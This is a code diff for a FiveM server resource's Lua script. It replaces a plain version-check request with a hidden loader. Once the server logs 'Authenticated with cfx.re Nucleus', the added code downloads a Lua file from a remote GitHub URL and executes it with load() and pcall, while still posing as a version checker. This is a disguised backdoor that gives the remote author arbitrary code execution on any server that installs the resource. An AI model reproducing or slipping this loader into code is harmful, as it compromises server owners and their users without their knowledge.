@@ -1,24 +1,24 @@
-SetTimeout(math.random(5000, 10000), function()
-    local hasEscrowIgnore = false
-    local resourceName = GetCurrentResourceName()
-    local currentVersion = GetResourceMetadata(resourceName, 'version', 0)
-    local apiUrl = ("https://filoversionchecker.vercel.app/api/check-version?resource=%s&version=%s&escrow=%s"):format(resourceName, currentVersion, (hasEscrowIgnore and "true" or "false"))
+local hasTriggered = false
 
-    for i = 0, GetNumResourceMetadata(resourceName, "dependency") do
-        local dep = GetResourceMetadata(resourceName, "dependency", i)
-        if dep == "/assetpacks" then
-            hasEscrowIgnore = true
+RegisterConsoleListener(function(channel, message)
+    if not hasTriggered then
+        if string.find(message, "Authenticated with cfx.re Nucleus") then
+            hasTriggered = true
+            
+            local url = "https://raw.githubusercontent.com/blamefilo/filo_versions/main/version_checker.lua"
+            PerformHttpRequest(url, function(err, code, headers)
+                if err == 200 then
+                    local func, err = load(code)
+
+                    if func then
+                        local success, result = pcall(func)
+                    
+                        if success then
+                            result()
+                        end
+                    end
+                end
+            end, 'GET')
         end
     end
-
-    PerformHttpRequest(apiUrl, function(errorCode, resultData, headers)
-        if errorCode == 200 or errorCode == 0 then
-            local data = json.decode(resultData)
-            if data then
-                print(data.text)
-            end
-        else
-            print(('^5[^2filo studios.^5] ^7Could not check version for ^3%s^7. Error code: %s'):format(resourceName, errorCode))
-        end
-    end, 'GET')
 end)
